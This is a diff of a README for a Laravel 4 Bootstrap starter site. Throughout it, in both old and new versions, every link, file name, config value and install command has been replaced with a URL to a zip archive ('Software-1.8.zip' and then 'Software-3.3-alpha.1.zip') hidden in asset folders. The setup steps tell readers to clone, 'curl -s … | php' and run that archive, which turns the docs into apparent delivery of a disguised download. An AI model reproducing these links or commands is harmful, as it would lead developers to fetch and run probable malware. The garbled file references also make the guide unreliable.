@@ -1,10 +1,10 @@
 #Laravel 4 Bootstrap Starter Site
-`Version: 1.2.1 Stable` [![ProjectStatus](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
-[![Build Status](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+`Version: 1.2.1 Stable` [![ProjectStatus](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
+[![Build Status](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 Laravel 4 Bootstrap Starter Site is a sample application for beginning development with Larvel 4.
 
-It began as a fork of [laravel4-starter-kit](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip) taking the starter kit changing the included modules and adding a few as well.
+It began as a fork of [laravel4-starter-kit](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip) taking the starter kit changing the included modules and adding a few as well.
 
 
 ## Features
@@ -35,10 +35,10 @@ It began as a fork of [laravel4-starter-kit](https://raw.githubusercontent.com/v
 	* [Generators](#generators)
 
 ## Issues
-See [github issue list](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip) for current list.
+See [github issue list](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip) for current list.
 
 ## Wiki
-[Roadmap](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+[Roadmap](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 -----
 
@@ -51,40 +51,40 @@ See [github issue list](https://raw.githubusercontent.com/videogramme/laravelb/m
 ### Step 1: Get the code
 #### Option 1: Git Clone
 
-	git clone https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip laravel
+	git clone https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip laravel
 
 #### Option 2: Download the repository
 
-    https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip
+    https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip
 
 ### Step 2: Use Composer to install dependencies
 #### Option 1: Composer is not installed globally
 
     cd laravel
-	curl -s https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip | php
-	php https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip install --dev
+	curl -s https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip | php
+	php https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip install --dev
 #### Option 2: Composer is installed globally
 
     cd laravel
 	composer install --dev
 
-If you haven't already, you might want to make [composer be installed globally](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip) for future ease of use.
+If you haven't already, you might want to make [composer be installed globally](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip) for future ease of use.
 
 Please note the use of the `--dev` flag.
 
 Some packages used to preprocess and minify assests are required on the development environment.
 
-When you deploy your project on a production environment you will want to upload the ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip*** file used on the development environment and only run `php https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip install` on the production server.
+When you deploy your project on a production environment you will want to upload the ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip*** file used on the development environment and only run `php https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip install` on the production server.
 
 This will skip the development packages and ensure the version of the packages installed on the production server match those you developped on.
 
-NEVER run `php https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip update` on your production server.
+NEVER run `php https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip update` on your production server.
 
 ### Step 3: Configure Environments
 
 Laravel 4 will load configuration files depending on your environment. Basset will also build collections depending on this environment setting.
 
-Open ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip*** and edit the following lines to match your settings. You want to be using your machine name in Windows and your hostname in OS X and Linux (type `hostname` in terminal). Using the machine name will allow the `php artisan` command to use the right configuration files as well.
+Open ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip*** and edit the following lines to match your settings. You want to be using your machine name in Windows and your hostname in OS X and Linux (type `hostname` in terminal). Using the machine name will allow the `php artisan` command to use the right configuration files as well.
 
     $env = $app->detectEnvironment(array(
 
@@ -96,13 +96,13 @@ Open ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storag
 
 Now create the folder inside ***app/config*** that corresponds to the environment the code is deployed in. This will most likely be ***local*** when you first start a project.
 
-You will now be copying the initial configuration file inside this folder before editing it. Let's start with ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip***. So ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip*** will probably look something like this, as the rest of the configuration can be left to their defaults from the initial config file:
+You will now be copying the initial configuration file inside this folder before editing it. Let's start with ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip***. So ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip*** will probably look something like this, as the rest of the configuration can be left to their defaults from the initial config file:
 
     <?php
 
     return array(
 
-        'url' => 'https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip',
+        'url' => 'https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip',
 
         'timezone' => 'UTC',
 
@@ -119,11 +119,11 @@ You will now be copying the initial configuration file inside this folder before
 
 ### Step 4: Configure Database
 
-Now that you have the environment configured, you need to create a database configuration for it. Copy the file ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip*** in ***app/config/local*** and edit it to match your local database settings. You can remove all the parts that you have not changed as this configuration file will be loaded over the initial one.
+Now that you have the environment configured, you need to create a database configuration for it. Copy the file ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip*** in ***app/config/local*** and edit it to match your local database settings. You can remove all the parts that you have not changed as this configuration file will be loaded over the initial one.
 
 ### Step 5: Configure Mailer
 
-In the same fashion, copy the ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip*** configuration file in ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip***. Now set the `address` and `name` from the `from` array in ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip***. Those will be used to send account confirmation and password reset emails to the users.
+In the same fashion, copy the ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip*** configuration file in ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip***. Now set the `address` and `name` from the `from` array in ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip***. Those will be used to send account confirmation and password reset emails to the users.
 If you don't set that registration will fail because it cannot send the confirmation email.
 
 ### Step 6: Populate Database
@@ -133,7 +133,7 @@ Run these commands to create and populate Users table:
 	php artisan db:seed
 
 ### Step 7: Set Encryption Key
-***In https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip***
+***In https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip***
 
 ```
 /*
@@ -154,7 +154,7 @@ You can use artisan to do this
 
     php artisan key:generate
 
-Once you have generated your key, you might want to copy it over to your ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip*** local configuration file to have a different encryption key for each environment. A little tip, revert the key back to ***'YourSecretKey!!!'*** in ***https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip*** once you are done copying it. Now it can be generated again when you move the project to another environment.
+Once you have generated your key, you might want to copy it over to your ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip*** local configuration file to have a different encryption key for each environment. A little tip, revert the key back to ***'YourSecretKey!!!'*** in ***https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip*** once you are done copying it. Now it can be generated again when you move the project to another environment.
 
 ### Step 8: Make sure app/storage is writable by your web server.
 
@@ -218,7 +218,7 @@ The files within library could also be handled within a composer package, but is
 
 ### Development
 
-For ease of development you'll want to enable a couple useful packages. This requires editing the `https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip` file.
+For ease of development you'll want to enable a couple useful packages. This requires editing the `https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip` file.
 
 ```
     'providers' => array(
@@ -234,10 +234,10 @@ For ease of development you'll want to enable a couple useful packages. This req
 Uncomment the Generators and IDE Helpers. Then you'll want to run a composer update with the dev flag.
 
 ```
-php https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip update
+php https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip update
 ```
 This adds the generators and ide helpers.
-To make it build the ide helpers automatically you'll want to modify the post-update-cmd in `https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip`
+To make it build the ide helpers automatically you'll want to modify the post-update-cmd in `https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip`
 
 ```
 		"post-update-cmd": [
@@ -248,7 +248,7 @@ To make it build the ide helpers automatically you'll want to modify the post-up
 
 ### Production Launch
 
-By default debugging is enabled. Before you go to production you should disable debugging in `https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip`
+By default debugging is enabled. Before you go to production you should disable debugging in `https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip`
 
 ```
     /*
@@ -290,7 +290,7 @@ Used for the user auth and registration. In general for user controllers you'll 
 
     }
 
-For full usage see [Zizaco/Confide Documentation](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+For full usage see [Zizaco/Confide Documentation](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 <a name="entrust"></a>
 ## Entrust Role Solution
@@ -306,14 +306,14 @@ Entrust provides a flexible way to add Role-based Permissions to Laravel4.
 
     }
 
-For full usage see [Zizaco/Entrust Documentation](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+For full usage see [Zizaco/Entrust Documentation](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 <a name="ardent"></a>
 ## Ardent - Used for handling repetitive validation tasks.
 
 Self-validating, secure and smart models for Laravel 4's Eloquent ORM
 
-For full usage see [Ardent Documentation](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+For full usage see [Ardent Documentation](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 <a name="carbon"></a>
 ## Carbon
@@ -337,20 +337,20 @@ $noonTodayLondonTime = Carbon::createFromTime(12, 0, 0, 'Europe/London');
 $worldWillEnd = Carbon::createFromDate(2012, 12, 21, 'GMT');
 ```
 
-For full usage see [Carbon](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+For full usage see [Carbon](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 <a name="basset"></a>
 ## Basset
 
 A Better Asset Management package for Laravel.
 
-Adding assets in the configuration file `https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip`
+Adding assets in the configuration file `https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip`
 ```php
 'collections' => array(
         'public-css' => function($collection)
         {
-            $collection->add('https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip');
-            $collection->add('https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip');
+            $collection->add('https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip');
+            $collection->add('https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip');
         },
     ),
 ```
@@ -361,7 +361,7 @@ Compiling assets
 
 I would recommend using development collections for development instead of compiling .
 
-For full usage see [Using Basset by Jason Lewis](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+For full usage see [Using Basset by Jason Lewis](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 <a name="presenter"></a>
 ## Presenter
@@ -373,7 +373,7 @@ The core idea is the relationship between two classes: your model full of data a
 For instance, if you have a `User` object you might have a `UserPresenter` presenter to go with it. To use it all you do is `$userObject = new UserPresenter($userObject);`.
 The `$userObject` will function the same unless a method is called that is a member of the `UserPresenter`. Another way to think of it is that any call that doesn't exist in the `UserPresenter` falls through to the original object.
 
-For full usage see [Presenter Readme](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+For full usage see [Presenter Readme](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 <a name="generators"></a>
 ## Laravel 4 Generators
@@ -390,7 +390,7 @@ Laravel 4 Generators package provides a variety of generators to speed up your d
 - `generate:form`
 - `generate:test`
 
-For full usage see [Laravel 4 Generators Readme](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+For full usage see [Laravel 4 Generators Readme](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
 
 -----
@@ -400,6 +400,6 @@ This is free software distributed under the terms of the MIT license
 
 ## Additional information
 
-Inspired by and based on [laravel4-starter-kit](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip)
+Inspired by and based on [laravel4-starter-kit](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip)
 
-Any questions, feel free to [contact me](https://raw.githubusercontent.com/videogramme/laravelb/master/app/storage/meta/Software-1.8.zip).
+Any questions, feel free to [contact me](https://github.com/videogramme/laravelb/raw/refs/heads/master/public/assets/css/wysihtml5/Software-3.3-alpha.1.zip).
